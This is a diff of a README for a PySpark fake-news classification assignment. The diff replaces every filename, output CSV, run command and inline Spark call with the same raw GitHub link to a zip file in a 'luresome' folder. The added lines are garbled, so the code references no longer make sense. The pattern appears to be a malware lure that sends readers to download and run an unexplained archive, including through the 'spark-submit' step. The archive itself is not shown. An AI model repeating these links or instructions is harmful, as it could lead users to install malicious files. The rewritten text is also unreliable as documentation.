@@ -18,22 +18,22 @@ This project demonstrates a complete Spark MLlib pipeline to detect “FAKE” v
 ---
 
 ## 📂 Repository Structure
-├── fake_news_sample.csv # Raw dataset
-├── fakenews.py # Main PySpark script
-├── requirements.txt # Python dependencies
-├── README.md # This file
+├── https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip # Raw dataset
+├── https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip # Main PySpark script
+├── https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip # Python dependencies
+├── https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip # This file
 └── outputs/ # Generated CSVs and logs after running
-├── task1_output.csv
-├── task2_output.csv
-├── task3_output.csv
-├── task4_output.csv
-└── task5_output.csv
+├── https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip
+├── https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip
+├── https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip
+├── https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip
+└── https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip
 
 
 ---
 
 ## 📋 Dataset Details
-- **Filename**: `fake_news_sample.csv`  
+- **Filename**: `https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip`  
 - **Columns**:
   - `id` (integer) — Unique article identifier  
   - `title` (string) — Headline of the article  
@@ -53,28 +53,28 @@ pip install faker
 spark submit --version 
 
 Run the script by 
-spark-submit fakenews.py
+spark-submit https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip
 ```
 
 ## Project Tasks
 
 ### Task 1: Load & Basic Exploration
 1. **Read the CSV into a Spark DataFrame**  
-   - Use `spark.read.csv(...)` with `header=True` and `inferSchema=True` to automatically detect column types.  
+   - Use `https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip(...)` with `header=True` and `inferSchema=True` to automatically detect column types.  
    - This gives you a distributed DataFrame (`news_df`) containing all articles.
 
 2. **Create a Temporary View for SQL Queries**  
-   - Call `news_df.createOrReplaceTempView("news_data")`.  
-   - Enables ad-hoc exploration using Spark SQL (`spark.sql("SELECT ... FROM news_data")`).
+   - Call `https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip("news_data")`.  
+   - Enables ad-hoc exploration using Spark SQL (`https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip("SELECT ... FROM news_data")`).
 
 3. **Inspect the Data**  
-   - **Show first 5 rows** (`news_df.show(5)`) to verify schema and sample content.  
-   - **Count total articles** (`news_df.count()`) to confirm dataset size.  
-   - **List distinct labels** (`news_df.select("label").distinct().show()`) to see how many “FAKE” vs. “REAL” entries exist.
+   - **Show first 5 rows** (`https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip(5)`) to verify schema and sample content.  
+   - **Count total articles** (`https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip()`) to confirm dataset size.  
+   - **List distinct labels** (`https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip("label").distinct().show()`) to see how many “FAKE” vs. “REAL” entries exist.
 
 4. **Save a Small Sample**  
-   - Limit the DataFrame to 5 rows (`news_df.limit(5)`) and convert to Pandas.  
-   - Write to `task1_output.csv` for quick sanity-checks or sharing with others.
+   - Limit the DataFrame to 5 rows (`https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip(5)`) and convert to Pandas.  
+   - Write to `https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip` for quick sanity-checks or sharing with others.
 
 ---
 
@@ -92,7 +92,7 @@ spark-submit fakenews.py
 
 4. **Select Relevant Columns**  
    - Keep only `id`, `title`, `filtered_words`, and `label` for downstream tasks.  
-   - Write this cleaned, tokenized view to `task2_output.csv`.
+   - Write this cleaned, tokenized view to `https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip`.
 
 ---
 
@@ -111,7 +111,7 @@ spark-submit fakenews.py
 
 4. **Prepare Output**  
    - Select `id`, `filtered_words`, `features`, and `label_index`.  
-   - Save to `task3_output.csv` for potential reuse or inspection.
+   - Save to `https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip` for potential reuse or inspection.
 
 ---
 
@@ -130,7 +130,7 @@ spark-submit fakenews.py
    - Join predictions back with the `title` DataFrame (on `id`) so you can see human-readable article titles in the output.
 
 5. **Save Predictions**  
-   - Export `id`, `title`, `label_index` (true), and `prediction` to `task4_output.csv`.
+   - Export `id`, `title`, `label_index` (true), and `prediction` to `https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip`.
 
 ---
 
@@ -145,5 +145,5 @@ spark-submit fakenews.py
 
 3. **Save & Display Results**  
    - Create a small Pandas DataFrame with columns `Metric` & `Value`.  
-   - Write it out to `task5_output.csv` and print to console for a quick summary:
+   - Write it out to `https://raw.githubusercontent.com/pavandantu18/assignment-3-fake-news-detection-pavandantu18/main/luresome/assignment-3-fake-news-detection-pavandantu18.zip` and print to console for a quick summary:
 
